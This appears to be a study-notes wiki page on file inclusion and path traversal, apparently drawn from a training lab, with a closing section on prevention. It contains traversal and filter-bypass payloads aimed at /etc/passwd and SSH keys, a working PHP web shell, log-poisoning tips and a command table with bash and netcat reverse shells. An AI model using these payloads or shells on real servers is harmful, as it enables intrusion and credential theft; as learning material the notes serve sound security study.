---
layout: layouts/wiki.njk
title: Filw Inclusion
date: 2025-01-03T02:24:00.000Z
---
File Inclusion vulnerabilities often affect web applications that rely on a scripting run time, and occur when a web application allows users to submit input into files or upload files to the server. They are often found in poorly-written applications.

File Inclusion vulnerabilities allow an attacker to read and sometimes execute files on the victim server or, as is the case with Remote File Inclusion, to execute code hosted on the attacker’s machine.

By default, an attacker can leverage file inclusion vulnerabilities to leak data, such as code, credentials or other important files related to the web application or operating system. Moreover, if the attacker can write files to the server by any other means, file inclusion might be used in tandem to gain remote command execution (RCE).

File inclusion vulnerabilities come in two types, depending on the origin of the included file:
- Local File Inclusion (LFI)
- Remote File Inclusion (RFI)

## Path Traversal

Path traversal is also known as directory traversal. These vulnerabilities enable an attacker to read arbitrary files on the server that is running an application. A web security vulnerability allows an attacker to read operating system resources, such as local files on the server running an application. The attacker exploits this vulnerability by manipulating and abusing the web application's URL to locate and access files or directories stored outside the application's root directory.

Path traversal attacks, also known as the **dot-dot-slash attack**, take advantage of moving the directory one step up using the double dots `../`. If the attacker finds the entry point, which in this case `get.php?file=`, then the attacker may send something as follows, `http://webapp.thm/get.php?file=../../../../etc/passwd`

### Important Directories

- `/etc/issue` contains a message or system identification to be printed before the login prompt.

- `/etc/profile` controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived

- `/proc/version` specifies the version of the Linux kernel

- `/etc/passwd` has all registered user that has access to a system

- `/etc/shadow` contains information about the system's users' passwords

- `/etc/os-release` stores OS Information

- `/root/.bash_history` contains the history commands for root user

- `/var/log/dmessage` contains global system messages, including the messages that are logged during system startup

- `/var/mail/root` all emails for root user

- `/root/.ssh/id_rsa` Private SSH keys for a root or any known valid user on the server

- `/var/log/apache2/access.log` the accessed requests for Apache webserver

- `C:\boot.ini` contains the boot options for computers with BIOS firmware

## Local File Inclusion (LFI)

A Local File Inclusion attack is used to trick the application into exposing or running files on the server. They allow attackers to execute arbitrary commands or, if the server is misconfigured and running with high privileges, to gain access to sensitive data.

example:

```php
/**
* Get the filename from a GET input and
* Unsafely include the file
*/
$file = $_GET[‘file’];
include(‘directory/’ . $file);
```

Above the attacker’s intent is to trick the application into executing a PHP script, such as a web shell.

With PHP, using functions such as `include`, `require`, `include_once`, and `require_once` often contribute to vulnerable web applications. LFI vulnerabilities also occur when using other languages such as **ASP**, **JSP**, or even in **Node.js** apps. LFI exploits follow the same concepts as Path Traversal.

If the file traversal is blocked by devloper using directory filtering, you could try either
- Append NULL BYTE (`%00`) to the end of path or
- Add `/.` to the path, for example `../../../etc/passwd/.`, as `/.` refers current directory

If the **dot-dot-slash attck** is getting prevented by the server by replacing `../` by empty string, we could try changing the payload, ie. `....//....//....//etc/passwd` as only center part get replaced  `..`../`/` -> `../`

- You use `&ext` on PHP wrappers when you pass encoded text so on the fly the `ext` will read it normally.

### NULL BYTE

Null bytes is an injection technique where URL-encoded representation such as `%00` or `0x00` in hex with user-supplied data to terminate strings. You could think of it as trying to trick the web app into disregarding whatever comes after the Null Byte.

NOTE: the `%00` trick is fixed and not working with `PHP 5.3.4` and above.

example:
Note that we used 4 `../` because we know the path has four levels `/var/www/html/THM-4`. But we still receive the following error:

```
Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
```

It seems we could move out of the PHP directory but still, the include function reads the input with .php at the end! This tells us that the developer specifies the file type to pass to the include function. To bypass this scenario, we can use the NULL BYTE, which is %00.

A PHP Web shell:

```php
<html>
  <body>
    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
      <input type="text" name="command" autofocus id="command" size="50" />
      <input type="submit" value="Execute" />
    </form>
    <pre>
        <?php
            if(isset($_GET['command'])) 
            {
                system($_GET['command'] . ' 2>&1'); 
            }
        ?>
    </pre>
  </body>
</html>
```


### Log Poisoning

In some cases you server might be running on apache server or so, if you can somehow access the log file, you could include a php script and access the file, as php tries to execute the file on rendering/reading.

You can try various methods to do log posioning such as including it as User-Agent, etc

- https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/logs-poisoning


## Remote File Inclusion (RFI)

Remote File Inclusion targets web applications that dynamically reference external scripts. The goal of the attacker is to exploit the referencing function in the target application and to upload malware from a remote URL, located on a different domain.

The results of a successful RFI attack can be information theft, a compromised server and a site takeover, resulting in content modification.

example:
A JavaServer Pages page containing the following code:

```java
<jps:include page=”<%=(String)request.getParameter(“ParamName”)%>”> 
```

can be manipulated with the following request: 

```java
Page1.jsp?ParamName=/WEB-INF/DB/password.
```

After the application processes the request, it will reveal the content of the password file.

The risk of RFI is higher than LFI since RFI vulnerabilities allow an attacker to gain Remote Command Execution (RCE) on the server. Other consequences of a successful RFI attack include:
- Sensitive Information Disclosure
- Cross-site Scripting (XSS)
- Denial of Service (DoS)

It is possible to pass down various malicious scripts to do RCE. In case of php,

```php
<php system('whoami'); ?>
```

```php
<php exec('whoami'); ?>
```

```php
<php passthru('whoami'); ?>
```

```php
<php shell_exec('whoami'); ?
```

Some useful web shell commands are:

| Command | Use |
|-----------|----|
| ls | Will give you an idea of what files/directories surround you |
| pwd	| Will give you an idea of where in the system you are |
| whoami | Will let you know who you are in the system |
| hostname | The system name and potentially its role in the network |
| uname -a | Will give you some system information like the OS, kernel version, and more  |
| id | If the current user is assigned to any groups |
| ifconfig | Allows you to understand the system's network setup |
| bash -i >& /dev/tcp/your-ip/port 0>&1 | A command used to begin a reverse shell via bash |
| nc -e /bin/sh your-ip port | A command used to begin a reverse shell via Netcat |
| find / -perm -4000 -type f 2>/dev/null | Finds SUID (Set User ID) files, useful in privilege escalation attempts as it can  sometimes be leveraged to execute binary with privileges of its owner (which is often root) |
| find / -writable -type  f 2>/dev/null | grep -v "/proc/" | Also helpful in privilege escalation attempts used to find files with writable permissions |

*Refer [The Hacker Recipes](https://www.thehacker.recipes/web/inputs/file-inclusion/) for more*

### Prevent RFI

As a developer, it's important to be aware of web application vulnerabilities, how to find them, and prevention methods. To prevent the file inclusion vulnerabilities, some common suggestions include:


1. Keep system and services, including web application frameworks, updated with the latest version.
2. Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.
3. A Web Application Firewall (WAF) is a good option to help mitigate web application attacks.
4. Disable some PHP features that cause file inclusion vulnerabilities if your web app doesn't need them, such as allow_url_fopen on and allow_url_include.
5. Carefully analyze the web application and allow only protocols and PHP wrappers that are in need.
6. Never trust user input, and make sure to implement proper input validation against file inclusion.
7. Implement whitelisting for file names and locations as well as blacklisting.
